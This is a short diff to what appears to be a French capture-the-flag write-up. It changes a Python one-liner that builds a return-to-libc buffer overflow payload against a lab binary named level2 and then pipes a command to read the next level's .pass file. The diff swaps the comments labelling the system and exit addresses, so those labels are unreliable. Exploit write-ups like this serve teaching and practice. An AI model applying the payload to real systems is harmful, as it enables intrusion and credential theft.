@@ -138,8 +138,8 @@ Je construis mon payload en utilisant python, y ajoute une lecture du `.pass` du
 ```python
 (python -c 'print("\x90"*80
 + "\x08\x04\x85\x3e"[::-1] # <- return address of p [::-1] is an inverted splice
-+ "\xb7\xe6\xb0\x60"[::-1] # <- return address of system
-+ "\x08\x04\x83\xd0"[::-1] # <- return address of exit
++ "\xb7\xe6\xb0\x60"[::-1] # <- return address of exit
++ "\x08\x04\x83\xd0"[::-1] # <- return address of system
 + "\xb7\xf8\xcc\x58"[::-1] # <- return address of "bin/sh"
 )' && echo 'cat /home/user/level3/.pass') | ./level2
 
